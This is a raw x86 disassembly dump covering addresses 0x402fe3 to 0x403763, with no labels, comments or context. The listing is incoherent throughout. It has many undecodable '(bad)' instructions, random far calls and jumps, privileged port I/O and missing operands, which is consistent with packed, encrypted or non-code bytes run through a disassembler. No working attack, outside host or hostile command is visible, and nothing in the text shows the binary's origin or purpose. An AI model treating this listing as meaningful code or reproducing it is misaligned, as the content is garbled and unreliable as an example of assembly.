  402fe3:	pop    ds
  402fe4:	repnz test DWORD PTR [eax-0x48],esp
  402fe8:	ds sub dh,ah
  402feb:	mov    cl,0x2
  402fed:	pop    eax
  402fee:	and    BYTE PTR [ebp+edi*4-0xe844ea7],ch
  402ff5:	mov    WORD PTR [ecx-0x6d],?
  402ff8:	mov    eax,ds:0x728c7ab3
  402ffd:	or     al,ah
  402fff:	inc    ebp
  403000:	test   al,0x15
  403002:	imul   esp,DWORD PTR [edi],0x66
  403005:	xor    edx,edx
  403007:	clc    
  403008:	jmp    0x402fa9
  40300a:	add    eax,0xa014709e
  40300f:	pop    ebp
  403010:	push   edi
  403011:	rcr    edi,cl
  403013:	lds    edx,FWORD PTR [edi+0x27b2b20]
  403019:	call   0x65ddb466
  40301e:	pusha  
  40301f:	test   BYTE PTR [eax+0x79],cl
  403022:	sub    eax,0xd787da5b
  403027:	mov    ds:0x76d337c4,eax
  40302c:	push   ebp
  40302d:	xchg   ebx,eax
  40302e:	mov    esp,0x7ff49055
  403033:	pushf  
  403034:	dec    ebp
  403035:	mov    edi,ebp
  403037:	fistp  DWORD PTR [ebx]
  403039:	xor    al,0x2
  40303b:	gs ins DWORD PTR es:[edi],dx
  40303d:	sub    al,BYTE PTR [ecx-0x96009b2]
  403043:	push   eax
  403044:	leave  
  403045:	out    dx,eax
  403046:	(bad)  
  403047:	sbb    ecx,DWORD PTR [ecx]
  403049:	push   edi
  40304a:	js     0x4030b6
  40304c:	fsub   st(2),st
  40304e:	jbe    0x403066
  403050:	mov    ch,BYTE PTR [ebx-0x5b]
  403053:	pop    esp
  403054:	outs   dx,DWORD PTR ds:[esi]
  403055:	mov    edx,0xa909db6b
  40305a:	sbb    eax,0xf8c2688
  40305f:	inc    esp
  403060:	sub    BYTE PTR cs:[ebx+0x38430b33],dh
  403067:	lahf   
  403068:	in     al,0x4b
  40306a:	(bad)  
  40306b:	pop    ecx
  40306c:	push   eax
  40306d:	sbb    BYTE PTR [ebp+esi*4+0x14d61024],al
  403074:	jb     0x403044
  403076:	stc    
  403077:	add    eax,0x7ab2c4cc
  40307c:	push   esp
  40307d:	js     0x4030f3
  40307f:	loope  0x403091
  403081:	ror    DWORD PTR [edx],cl
  403083:	bound  ecx,QWORD PTR [edi-0x27]
  403086:	push   edx
  403087:	scas   eax,DWORD PTR es:[edi]
  403088:	inc    esi
  403089:	mov    ecx,0x8ca97a19
  40308e:	shr    DWORD PTR [ecx-0x8d4e713],1
  403094:	or     eax,0x21e530fb
  403099:	inc    edi
  40309a:	pop    esp
  40309b:	pop    ebx
  40309c:	fild   QWORD PTR [edi-0x509e0793]
  4030a2:	xor    eax,0xec84dd9f
  4030a7:	and    BYTE PTR [ebx+0x2c],bl
  4030aa:	loopne 0x4030d7
  4030ac:	fs popa 
  4030ae:	cmp    dh,bl
  4030b0:	outs   dx,DWORD PTR ds:[esi]
  4030b1:	(bad)
  4030b4:	ins    BYTE PTR es:[edi],dx
  4030b5:	daa    
  4030b6:	dec    eax
  4030b7:	adc    eax,0xf70aaf53
  4030bc:	mov    eax,ds:0x90431235
  4030c1:	mov    ebx,0x68324b54
  4030c6:	loopne 0x4030aa
  4030c8:	not    DWORD PTR [ecx+0x3e]
  4030cb:	mov    dh,0xe2
  4030cd:	xchg   BYTE PTR [edx-0x7a],bl
  4030d0:	nop
  4030d1:	push   es
  4030d2:	xlat   BYTE PTR ds:[ebx]
  4030d3:	adc    ch,al
  4030d5:	loop   0x4030f9
  4030d7:	sbb    esp,edi
  4030d9:	cld    
  4030da:	mov    ebp,0xb1258a8d
  4030df:	aaa    
  4030e0:	pusha  
  4030e1:	loop   0x4030a7
  4030e3:	mov    esi,gs
  4030e5:	cmp    edx,esp
  4030e7:	hlt    
  4030e8:	jns    0x4030e9
  4030ea:	cmp    al,BYTE PTR [edx+0x6]
  4030ed:	pop    edx
  4030ee:	es call 0x895a:0xb036f481
  4030f6:	fld    QWORD PTR [eax+0x1a5411f3]
  4030fc:	push   eax
  4030fd:	or     ah,BYTE PTR [edi]
  4030ff:	gs xchg ebp,eax
  403101:	pop    ecx
  403102:	clc    
  403103:	mov    edi,0x51ed65d0
  403108:	cwde   
  403109:	(bad)  
  40310a:	fcom   DWORD PTR [edx]
  40310c:	adc    BYTE PTR [ebx],cl
  40310e:	xchg   esp,esp
  403110:	fimul  WORD PTR [eax+0x685c0003]
  403116:	and    DWORD PTR [bx],edi
  403119:	inc    esp
  40311a:	repz sbb al,0xa4
  40311d:	mov    WORD PTR [edi-0x1efb987b],gs
  403123:	inc    ebp
  403124:	push   edi
  403125:	pusha  
  403126:	cmp    BYTE PTR [edi+0x22],bh
  403129:	fild   WORD PTR [ebx-0x5d]
  40312c:	arpl   WORD PTR [ebp+eiz*4+0x30],si
  403130:	pop    edi
  403131:	push   0x9f60234e
  403136:	cdq    
  403137:	fcom   QWORD PTR [eax]
  403139:	xchg   ecx,eax
  40313a:	scas   al,BYTE PTR es:[edi]
  40313b:	in     al,dx
  40313c:	pop    esp
  40313d:	mov    ebp,0xea063d6c
  403142:	push   ds
  403143:	jg     0x4031a0
  403145:	dec    eax
  403146:	enter  0x4cb5,0xfe
  40314a:	adc    DWORD PTR [ebx],ebx
  40314c:	(bad)  
  40314d:	mov    al,ds:0x85c4022
  403152:	and    edx,esp
  403154:	push   ecx
  403155:	sbb    eax,0x1007ab01
  40315a:	test   DWORD PTR [ebx+0x3b],eax
  40315d:	push   ebp
  40315e:	in     eax,dx
  40315f:	pusha  
  403160:	mov    eax,ds:0xdf356083
  403165:	pop    eax
  403166:	bound  esp,QWORD PTR [ecx-0x361c5629]
  40316c:	fcom   QWORD PTR [ecx+ebx*2+0x7edab435]
  403173:	pop    edx
  403174:	call   0x4de3f863
  403179:	or     esp,DWORD PTR [eax]
  40317b:	imul   esp,DWORD PTR [ecx-0x3d5ad9bb],0x73
  403182:	cmp    al,0xa6
  403184:	sbb    BYTE PTR [esi+0x285156ec],0xc6
  40318b:	add    edi,DWORD PTR [ebx+0x7c]
  40318e:	pop    ebp
  40318f:	and    al,0x67
  403191:	repnz and DWORD PTR [eax+0x1b],edx
  403195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403196:	adc    DWORD PTR [edx],ebp
  403198:	in     eax,0x95
  40319a:	int3   
  40319b:	jnp    0x40314b
  40319d:	jbe    0x4031f9
  40319f:	add    DWORD PTR [edi-0x43],ebx
  4031a2:	das    
  4031a3:	les    edx,FWORD PTR [ecx-0x3c]
  4031a6:	cmp    cl,BYTE PTR [edx-0x7b]
  4031a9:	imul   ebp,DWORD PTR [ebx],0x52
  4031ac:	pop    eax
  4031ad:	aad    0x3b
  4031af:	lods   al,BYTE PTR ds:[esi]
  4031b0:	jle    0x4031fb
  4031b2:	loop   0x4031de
  4031b4:	jecxz  0x4031aa
  4031b6:	mov    cl,0x6b
  4031b8:	test   DWORD PTR [edx-0x20],ecx
  4031bb:	in     al,0xc6
  4031bd:	cli    
  4031be:	ins    BYTE PTR es:[edi],dx
  4031bf:	jne    0x403164
  4031c1:	mov    eax,0xfb55b2a1
  4031c6:	(bad)  
  4031c7:	(bad)  
  4031c8:	nop
  4031c9:	sub    BYTE PTR [eax-0x6bbd4ede],bl
  4031cf:	inc    edi
  4031d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031d1:	sub    DWORD PTR [esi],ecx
  4031d3:	dec    ebx
  4031d4:	cmp    DWORD PTR [esi],ecx
  4031d6:	cmp    cl,BYTE PTR [eax+0x4c]
  4031d9:	loop   0x4031c4
  4031db:	mov    dh,0xa8
  4031dd:	pushf  
  4031de:	add    edx,eax
  4031e0:	or     eax,0xfeed9f9a
  4031e5:	jnp    0x40316a
  4031e7:	and    al,0x33
  4031e9:	jp     0x40316e
  4031eb:	and    al,0x2c
  4031ed:	ficomp WORD PTR [edx+eiz*2]
  4031f0:	enter  0xabfa,0xb5
  4031f4:	add    DWORD PTR [esi-0x80],esp
  4031f7:	call   0xa613:0xde7475df
  4031fe:	dec    edx
  4031ff:	mov    esi,0x96c0718c
  403204:	iret   
  403205:	push   cs
  403206:	and    BYTE PTR [eax+0xc],cl
  403209:	mov    al,ds:0x19931903
  40320e:	mov    BYTE PTR [ebp+0x7e],ch
  403211:	adc    ebx,DWORD PTR [ebp+ebp*8-0x7f]
  403215:	dec    edx
  403216:	scas   eax,DWORD PTR es:[edi]
  403217:	unpcklps xmm6,xmm6
  40321a:	in     al,dx
  40321b:	xor    BYTE PTR [ecx],bl
  40321d:	std    
  40321e:	jbe    0x403225
  403220:	fild   DWORD PTR [ecx]
  403222:	add    al,0xfd
  403224:	scas   eax,DWORD PTR es:[edi]
  403225:	mov    esp,0xa97f1a85
  40322a:	je     0x40329a
  40322c:	and    eax,0x29e076b2
  403231:	cwde   
  403232:	dec    ecx
  403233:	xor    ch,BYTE PTR [eax+0x57b3858]
  403239:	mov    cl,0xfc
  40323b:	cmova  edi,DWORD PTR [edi+0x7c5d3c67]
  403242:	push   edx
  403243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403244:	cmp    dl,0x93
  403247:	addr16 dec ecx
  403249:	mov    DWORD PTR ds:0x8885559d,esp
  40324f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403250:	push   ebp
  403251:	jle    0x4032a2
  403253:	(bad)  
  403254:	push   esp
  403255:	mov    ebp,0x9cc6f9f2
  40325a:	scas   al,BYTE PTR es:[edi]
  40325b:	sti    
  40325c:	out    0xc1,eax
  40325e:	out    dx,al
  40325f:	or     BYTE PTR [esi-0x6df0c0b2],bh
  403265:	jp     0x403278
  403267:	dec    esi
  403268:	xor    edi,esi
  40326a:	jmp    0x1bd5:0xcb281791
  403271:	jle    0x4032ec
  403273:	xchg   ebp,eax
  403274:	cmp    DWORD PTR [ecx-0x4acf7af9],ecx
  40327a:	mov    ds:0x1beefb75,al
  40327f:	sbb    DWORD PTR [eax],ebp
  403281:	outs   dx,BYTE PTR ds:[esi]
  403282:	outs   dx,BYTE PTR ds:[esi]
  403283:	stos   BYTE PTR es:[edi],al
  403284:	lahf   
  403285:	das    
  403286:	clc    
  403287:	inc    ecx
  403288:	stc    
  403289:	(bad)  
  40328a:	cmp    ebp,DWORD PTR [edi]
  40328c:	icebp  
  40328d:	and    eax,0x679db879
  403292:	lahf   
  403293:	pop    ecx
  403294:	mov    ebx,DWORD PTR ds:0xb99600a8
  40329a:	in     eax,dx
  40329b:	sub    bl,bh
  40329d:	cmp    edx,esp
  40329f:	fistp  DWORD PTR [eax-0x6e]
  4032a2:	add    BYTE PTR [ecx+0x58],0xd
  4032a6:	pop    ds
  4032a7:	dec    ecx
  4032a8:	sahf   
  4032a9:	sub    bh,cl
  4032ab:	ins    DWORD PTR es:[edi],dx
  4032ac:	clc    
  4032ad:	sub    al,0xe0
  4032af:	jg     0x40326a
  4032b1:	in     eax,dx
  4032b2:	jae    0x4032b9
  4032b4:	ins    DWORD PTR es:[edi],dx
  4032b5:	push   esp
  4032b6:	mov    ecx,0x1446234d
  4032bb:	dec    eax
  4032bc:	aam    0xdb
  4032be:	(bad)  
  4032bf:	push   edi
  4032c0:	push   ebp
  4032c1:	scas   eax,DWORD PTR es:[edi]
  4032c2:	inc    esp
  4032c3:	lods   al,BYTE PTR ds:[esi]
  4032c4:	cmp    al,0x91
  4032c6:	xlat   BYTE PTR ds:[ebx]
  4032c7:	scas   eax,DWORD PTR es:[edi]
  4032c8:	mov    edx,0x75d24879
  4032cd:	leave  
  4032ce:	dec    edx
  4032cf:	lods   al,BYTE PTR ds:[esi]
  4032d0:	xchg   DWORD PTR [eax+0x47],eax
  4032d3:	or     eax,0x16db9fa3
  4032d8:	mov    al,ds:0x373dc091
  4032dd:	sub    DWORD PTR [ebp-0x470f870d],0x86d338af
  4032e7:	cdq    
  4032e8:	sti    
  4032e9:	xchg   esp,eax
  4032ea:	cmp    al,0x12
  4032ec:	mov    cl,0x2
  4032ee:	loope  0x403322
  4032f0:	scas   eax,DWORD PTR es:[di]
  4032f2:	out    dx,al
  4032f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032f4:	dec    eax
  4032f5:	adc    ebx,DWORD PTR [ecx-0x72]
  4032f8:	mov    al,0x6f
  4032fa:	dec    esi
  4032fb:	test   BYTE PTR [ebx+eiz*2+0x48],0x3d
  403300:	dec    ecx
  403301:	(bad)  [ecx+0x1c]
  403304:	push   ecx
  403305:	add    edi,DWORD PTR [ebp-0x65]
  403308:	cmp    al,0xe5
  40330a:	cmp    al,BYTE PTR [edx-0x71]
  40330d:	cmp    al,dl
  40330f:	std    
  403310:	add    esp,DWORD PTR [edx+edx*4]
  403313:	test   DWORD PTR [eax+0x6b],esi
  403316:	test   BYTE PTR [edx-0x74],bl
  403319:	sahf   
  40331a:	pusha  
  40331b:	dec    esi
  40331c:	xchg   ebp,eax
  40331d:	std    
  40331e:	(bad)  
  40331f:	cmp    al,0x4b
  403321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403322:	shl    DWORD PTR [edx+0x5ff1e4f],1
  403328:	daa    
  403329:	retf   0xbfb4
  40332c:	icebp  
  40332d:	mov    ds:0xd2fb1063,eax
  403332:	mov    cl,0x8f
  403334:	fnstsw WORD PTR [eax+eax*1-0x5]
  403338:	in     eax,dx
  403339:	sbb    DWORD PTR [eax],0xffffffd3
  40333c:	cli    
  40333d:	fidivr DWORD PTR [esp+ebx*1-0x6f4f841a]
  403344:	sti    
  403345:	sub    esp,esi
  403347:	ror    BYTE PTR [esi-0x49],cl
  40334a:	lods   eax,DWORD PTR ds:[esi]
  40334b:	pop    ss
  40334c:	push   cs
  40334d:	mov    ebp,0xfc68c1c6
  403352:	(bad)  
  403353:	shl    DWORD PTR [ebp-0x40],1
  403356:	xchg   esi,eax
  403357:	aaa    
  403358:	(bad)  
  403359:	dec    ebp
  40335a:	daa    
  40335b:	test   bl,al
  40335d:	cli    
  40335e:	lods   eax,DWORD PTR ds:[esi]
  40335f:	pop    ebp
  403360:	adc    al,0x59
  403362:	in     al,0xd2
  403364:	aaa    
  403365:	xor    esi,DWORD PTR [esi*4+0x7cf6d00f]
  40336c:	fsubr  DWORD PTR [eax]
  40336e:	mov    edi,0xfb7725d
  403373:	lods   eax,DWORD PTR ds:[esi]
  403374:	dec    ecx
  403375:	or     DWORD PTR [esi],0xf755d85
  40337b:	adc    dh,BYTE PTR [ebp+0x532a15d8]
  403381:	xchg   edx,eax
  403382:	add    al,0xf0
  403384:	jmp    0x403370
  403386:	not    BYTE PTR [ecx+0x7f]
  403389:	pop    edi
  40338a:	sahf   
  40338b:	sar    DWORD PTR [esi],cl
  40338d:	mov    BYTE PTR [edi-0x384aa69b],dl
  403393:	imul   esi,DWORD PTR [ebx-0x2a],0x5d
  403397:	scas   al,BYTE PTR es:[edi]
  403398:	jb     0x4033ba
  40339a:	adc    al,0x71
  40339c:	retf   
  40339d:	xor    BYTE PTR es:[eax-0x39],0x2d
  4033a2:	and    eax,0x94e1f6df
  4033a7:	or     esi,DWORD PTR [ebp+0x5b64e830]
  4033ad:	ins    DWORD PTR es:[edi],dx
  4033ae:	fs jmp 0x4033dd
  4033b1:	leave  
  4033b2:	addr16 cdq 
  4033b4:	add    BYTE PTR [eax+0x53],cl
  4033b7:	shl    BYTE PTR [esi+0x51],0x4b
  4033bb:	inc    ebx
  4033bc:	aad    0xb2
  4033be:	out    0xd6,eax
  4033c0:	repnz scas al,BYTE PTR es:[edi]
  4033c2:	in     eax,0x72
  4033c4:	jae    0x4033b3
  4033c6:	addr16 jp 0x403430
  4033c9:	inc    ebp
  4033ca:	mov    ch,0xd4
  4033cc:	pusha  
  4033cd:	pop    esi
  4033ce:	jae    0x403412
  4033d0:	xor    cl,BYTE PTR [ecx-0x22437c89]
  4033d6:	call   0x12520a39
  4033db:	mov    al,ds:0x455b5697
  4033e0:	into   
  4033e1:	jns    0x403384
  4033e3:	sbb    al,dh
  4033e5:	push   ebx
  4033e6:	sub    DWORD PTR [esi],0x3a
  4033e9:	cmp    eax,0x4cc2ece1
  4033ee:	lods   al,BYTE PTR ds:[esi]
  4033ef:	push   0x8f7118f6
  4033f4:	inc    eax
  4033f5:	or     BYTE PTR [ecx-0x1e01c01d],dh
  4033fb:	aad    0x13
  4033fd:	sub    al,0xad
  4033ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403400:	add    al,0xdd
  403402:	cmp    esp,DWORD PTR [eax]
  403404:	and    bl,0x48
  403407:	retf   0x18fd
  40340a:	lods   eax,DWORD PTR ds:[esi]
  40340b:	mov    ds:0xfa804dd8,al
  403410:	or     al,0x1
  403412:	xchg   edx,eax
  403413:	pop    ebp
  403414:	xchg   edx,eax
  403415:	stos   DWORD PTR es:[edi],eax
  403416:	fdivrp st(7),st
  403418:	mov    ch,0x72
  40341a:	sub    edx,edi
  40341c:	xor    cl,BYTE PTR [edi+0x559ef9f7]
  403422:	sbb    eax,0x8cb0a370
  403427:	into   
  403428:	mov    edx,0x4d06200c
  40342d:	jecxz  0x40342d
  40342f:	fcom   DWORD PTR [edi-0x25]
  403432:	mov    al,ds:0xea2a6db1
  403437:	mov    bl,0xdd
  403439:	aam    0x48
  40343b:	daa    
  40343c:	jmp    0x403496
  40343e:	dec    esp
  40343f:	(bad)  
  403441:	clc    
  403442:	jge    0x40346c
  403444:	rcl    DWORD PTR [edx+0x5e],0x3c
  403448:	sub    cl,ah
  40344a:	repnz lahf 
  40344c:	arpl   WORD PTR [edi-0x2025a2a6],ax
  403452:	inc    ebp
  403453:	sahf   
  403454:	in     al,0x5d
  403456:	pop    ebp
  403457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403458:	fbstp  TBYTE PTR [ecx+edi*2-0x1c]
  40345c:	cmp    DWORD PTR [ecx+0x72],ebx
  40345f:	sti    
  403460:	sti    
  403461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403462:	lock sub bl,al
  403465:	cmp    dl,BYTE PTR [ecx-0x6b3df9ec]
  40346b:	outs   dx,DWORD PTR ds:[esi]
  40346c:	pop    DWORD PTR ds:0x83c3e393
  403472:	iret   
  403473:	sbb    ebp,ebp
  403475:	mov    bh,0x53
  403478:	lahf   
  403479:	gs js  0x4034cd
  40347c:	add    al,ah
  40347e:	push   ebp
  40347f:	push   ebp
  403480:	xor    BYTE PTR [ecx+0x5b],al
  403483:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403484:	pop    edi
  403485:	cmc    
  403486:	imul   ecx,DWORD PTR [eax+0x40122265],0xffffff8b
  40348d:	cmp    al,0x49
  403490:	inc    ebx
  403491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403492:	pop    ebx
  403493:	iret   
  403494:	mov    eax,ds:0x33b0d5f8
  403499:	test   DWORD PTR [esi],ecx
  40349b:	add    ebx,DWORD PTR [eax+0x22]
  40349e:	fld    QWORD PTR [eax+0x59863c61]
  4034a4:	in     eax,0xd8
  4034a6:	mov    al,0xbc
  4034a8:	dec    edx
  4034a9:	pop    edx
  4034aa:	ins    BYTE PTR es:[edi],dx
  4034ab:	std    
  4034ac:	push   edi
  4034ad:	fwait
  4034ae:	and    ecx,DWORD PTR [eax]
  4034b0:	daa    
  4034b1:	or     al,0x7a
  4034b3:	lods   eax,DWORD PTR ds:[esi]
  4034b4:	mov    ebx,0x476adae6
  4034b9:	xor    eax,0x548e80c
  4034be:	clc    
  4034bf:	or     BYTE PTR [ecx+0x23],0x2
  4034c3:	xchg   edi,eax
  4034c4:	and    DWORD PTR [esi+ebp*8+0x27],edx
  4034c8:	and    ah,BYTE PTR [ecx-0x5e]
  4034cb:	enter  0x15ce,0x5
  4034cf:	hlt    
  4034d0:	mov    esp,0xca50f751
  4034d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034d6:	mov    al,0x74
  4034d8:	sbb    BYTE PTR ds:0xe7956060,ah
  4034de:	call   0x79c55ced
  4034e3:	rol    BYTE PTR [ebx],cl
  4034e5:	iret   
  4034e6:	(bad)  
  4034e7:	es loope 0x4034b6
  4034ea:	jl     0x403471
  4034ec:	add    bl,bl
  4034ee:	int    0x32
  4034f0:	test   eax,0xd85039e1
  4034f5:	sub    eax,0xbbb4ecce
  4034fa:	dec    ebp
  4034fb:	mov    ebp,0x402e8c57
  403500:	repnz xchg esi,eax
  403502:	outs   dx,BYTE PTR ds:[esi]
  403503:	fist   DWORD PTR ss:[esi+0x20]
  403507:	dec    esp
  403508:	mov    cl,0x36
  40350a:	sbb    eax,0x5500fec7
  40350f:	push   edi
  403510:	inc    edx
  403511:	xor    al,0x71
  403513:	or     al,0x1f
  403515:	xchg   edi,eax
  403516:	arpl   dx,si
  403518:	or     eax,0xb4aa17a9
  40351d:	enter  0xf518,0xd7
  403521:	rcl    BYTE PTR [edi],0x44
  403524:	push   edx
  403525:	stos   BYTE PTR es:[edi],al
  403526:	out    0x6e,al
  403528:	push   0x5464fdfe
  40352d:	ret    0xc4c8
  403530:	sbb    BYTE PTR [esi+ebx*1],bl
  403533:	aad    0x6
  403535:	pop    edi
  403536:	pop    edi
  403537:	fsubrp st(1),st
  403539:	pushf  
  40353a:	add    eax,0xa4b739d9
  40353f:	shl    BYTE PTR [edi-0x29],1
  403542:	mov    cs:0x3f860253,al
  403548:	pop    edi
  403549:	pop    edi
  40354a:	push   ss
  40354b:	inc    eax
  40354c:	cmp    al,0xdd
  40354e:	shr    DWORD PTR [edi-0x39d54d18],cl
  403554:	leave  
  403555:	pop    esi
  403556:	lods   al,BYTE PTR ds:[esi]
  403557:	cmp    al,0x8e
  403559:	jne    0x403545
  40355b:	stc    
  40355c:	das    
  40355d:	out    0x41,al
  40355f:	fs mov bl,0x2c
  403562:	push   0x2f41c778
  403567:	outs   dx,BYTE PTR ds:[esi]
  403568:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403569:	mov    dl,0x6d
  40356b:	cmc    
  40356c:	dec    edx
  40356d:	mov    al,0x79
  40356f:	js     0x403524
  403571:	push   esi
  403572:	retf   0xca69
  403575:	inc    ebp
  403576:	pop    esp
  403577:	rcl    BYTE PTR ds:0x697db061,0x19
  40357e:	and    DWORD PTR [edx-0x48],0x49f7f5c3
  403585:	push   0xfa8e0bb4
  40358a:	xchg   esi,eax
  40358b:	push   eax
  40358c:	mov    ebx,0xda8537e5
  403591:	mov    al,0xfb
  403593:	out    0x8a,al
  403595:	pop    eax
  403596:	mov    ah,0xaf
  403598:	jg     0x403610
  40359a:	cwde   
  40359b:	cmp    edi,esp
  40359d:	adc    dl,BYTE PTR [edi]
  40359f:	rcl    DWORD PTR [esi+0x1f],cl
  4035a2:	or     cl,bl
  4035a4:	in     eax,dx
  4035a5:	sahf   
  4035a6:	shl    edi,cl
  4035a8:	cld    
  4035a9:	ud0    eax,DWORD PTR [ebx-0x1cc9bbb0]
  4035b0:	mov    bh,0x29
  4035b2:	cmp    DWORD PTR [ebp+0x69],eax
  4035b5:	jo     0x4035e4
  4035b7:	or     DWORD PTR [ebx],ebp
  4035b9:	push   esp
  4035ba:	ret    0x447
  4035bd:	push   cs
  4035be:	in     al,dx
  4035bf:	mov    ds,WORD PTR [edx+0x12]
  4035c2:	mov    ecx,0xcfbadbd6
  4035c7:	int3   
  4035c8:	and    ebx,DWORD PTR [edi-0x6088d4d8]
  4035ce:	cmc    
  4035cf:	leave  
  4035d0:	add    ecx,DWORD PTR [ecx-0x7aef9b33]
  4035d6:	out    0x1a,al
  4035d8:	jne    0x403619
  4035da:	sbb    eax,0x911ea1f
  4035df:	ror    DWORD PTR [edx+ecx*4],1
  4035e2:	fwait
  4035e3:	mov    edi,0x6bbf0d46
  4035e8:	mov    al,ds:0x62501e86
  4035ed:	popa   
  4035ee:	das    
  4035ef:	es scas eax,DWORD PTR es:[edi]
  4035f1:	add    edi,esp
  4035f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035f4:	jmp    0x4035a2
  4035f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035f7:	sahf   
  4035f8:	pop    eax
  4035f9:	in     eax,0x70
  4035fb:	add    DWORD PTR [eax],0x639b25e7
  403601:	and    BYTE PTR [ecx+ebp*8-0x25],0x84
  403606:	sub    esi,ebx
  403608:	cmp    ecx,DWORD PTR [edi-0x26]
  40360b:	and    BYTE PTR [ecx-0x2d5d0653],0x56
  403612:	cmp    al,0x8e
  403614:	cmp    ah,BYTE PTR [ebp+0x33]
  403617:	pop    esp
  403618:	stos   DWORD PTR es:[edi],eax
  403619:	mov    ?,edi
  40361b:	jae    0x4035e5
  40361d:	test   BYTE PTR [ebx+0x7f],dh
  403620:	fs sub eax,0x16d67797
  403626:	jbe    0x403699
  403628:	int    0x36
  40362a:	pop    ebx
  40362b:	xchg   ebp,eax
  40362c:	jle    0x403693
  40362e:	cdq    
  40362f:	(bad)  
  403630:	imul   esi,DWORD PTR [edi-0x1e],0x5f
  403634:	add    BYTE PTR [edx-0x49264e50],bh
  40363a:	imul   edx,ebx,0xd78edb84
  403640:	lods   eax,DWORD PTR ds:[esi]
  403641:	into   
  403642:	jo     0x4035da
  403644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403645:	ins    DWORD PTR es:[edi],dx
  403646:	loopne 0x4035e4
  403648:	adc    al,0xbf
  40364a:	jmp    0x403647
  40364c:	jae    0x403673
  40364e:	and    cl,BYTE PTR [edi+ecx*1]
  403651:	imul   edx,DWORD PTR [eax],0x9
  403654:	and    al,0x2
  403656:	div    DWORD PTR [esi+ecx*8]
  403659:	jbe    0x403669
  40365b:	into   
  40365c:	push   cs
  40365d:	xchg   edi,eax
  40365e:	mov    esi,0xb641e736
  403663:	dec    ebp
  403664:	xchg   esi,eax
  403665:	fadd   st(4),st
  403667:	xchg   ebp,eax
  403668:	jg     0x403664
  40366a:	push   esi
  40366b:	shr    BYTE PTR [esi+0x66],1
  40366e:	aam    0x2d
  403670:	sbb    DWORD PTR [ebx],0xf093d549
  403676:	pusha  
  403677:	cmp    edi,DWORD PTR [edx+0x1fed10b1]
  40367d:	clc    
  40367e:	jge    0x40362c
  403680:	fwait
  403681:	mov    edi,0xed53b128
  403686:	mov    al,0x55
  403688:	not    DWORD PTR [edx-0x1d]
  40368b:	xchg   ecx,eax
  40368c:	mov    bh,0x43
  40368e:	test   al,0x4d
  403690:	cmp    DWORD PTR ds:0xd615bf5d,edi
  403696:	and    esi,ebx
  403698:	or     eax,0x4b1fcc95
  40369d:	call   0xfd7f4ae2
  4036a2:	dec    esp
  4036a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036a4:	xchg   BYTE PTR [edx-0x3],bl
  4036a7:	and    BYTE PTR [ebp-0x3ec4247e],al
  4036ad:	or     DWORD PTR [esi],ebx
  4036af:	fidivr WORD PTR [ebx]
  4036b1:	jg     0x4036f5
  4036b3:	dec    ebp
  4036b4:	mov    DWORD PTR [eax+0x11],edi
  4036b7:	and    ch,BYTE PTR [edx]
  4036b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036ba:	pushf  
  4036bb:	leave  
  4036bc:	fisttp WORD PTR [edi-0x3978142b]
  4036c2:	adc    bh,BYTE PTR [ebx+0x5f962567]
  4036c8:	lds    esp,FWORD PTR [edi-0x7b18b7]
  4036ce:	xchg   BYTE PTR [edi],ah
  4036d0:	ret    0xdd9d
  4036d3:	cs push ds
  4036d5:	dec    edi
  4036d6:	xor    DWORD PTR [ebx-0x4e],ebx
  4036d9:	dec    eax
  4036da:	push   cs
  4036db:	cs mov bh,0x49
  4036de:	adc    DWORD PTR [edi-0x63],edx
  4036e1:	jmp    FWORD PTR [esi-0x20a7dd22]
  4036e7:	repnz stc 
  4036e9:	stos   BYTE PTR es:[edi],al
  4036ea:	xor    esi,DWORD PTR [di+0x64]
  4036ee:	pop    esi
  4036ef:	mov    ebp,esp
  4036f1:	int    0x88
  4036f3:	jae    0x40367b
  4036f5:	lods   eax,DWORD PTR ds:[esi]
  4036f6:	sub    al,0x78
  4036f8:	sar    BYTE PTR [esi],0x8a
  4036fb:	jb     0x40374d
  4036fd:	test   al,0x2f
  4036ff:	mov    cl,0x40
  403701:	pop    ss
  403702:	xchg   esp,eax
  403703:	int    0xa3
  403705:	sbb    ecx,DWORD PTR [eax+0x45]
  403708:	enter  0x3928,0xa4
  40370c:	icebp  
  40370d:	mov    ebp,0xd3d98411
  403712:	mov    ds:0x486bd1e1,al
  403717:	outs   dx,BYTE PTR ds:[esi]
  403718:	pop    es
  403719:	xchg   DWORD PTR [edx+ebx*1+0x79],esi
  40371d:	loopne 0x4036c1
  40371f:	ds xor al,0x48
  403722:	adc    DWORD PTR [edx+0x6d],ecx
  403725:	xor    cl,BYTE PTR [ebx]
  403727:	sub    ecx,DWORD PTR [ecx-0x4cc80fcb]
  40372d:	shl    BYTE PTR [edx-0x16d6341d],cl
  403733:	in     al,dx
  403734:	mov    cl,0xba
  403736:	ja     0x4036f3
  403738:	mov    bh,0xf6
  40373a:	in     al,0xe
  40373c:	cs ins DWORD PTR es:[edi],dx
  40373e:	cmc    
  40373f:	adc    eax,0xf3c1d1a8
  403744:	in     eax,0x49
  403746:	inc    edx
  403747:	or     dh,BYTE PTR [esi-0x5f]
  40374a:	test   BYTE PTR [eax+ecx*4],0xf8
  40374e:	(bad)  
  40374f:	cmc    
  403750:	pop    ecx
  403751:	gs (bad) 
  403753:	push   esp
  403754:	cmp    BYTE PTR [eax-0x26676fa1],ch
  40375a:	add    DWORD PTR [ebx-0x4d],0x3a
  40375e:	mov    ecx,0xd4f08fb2
  403763:	test   BYTE PTR [edi+0x55],bh
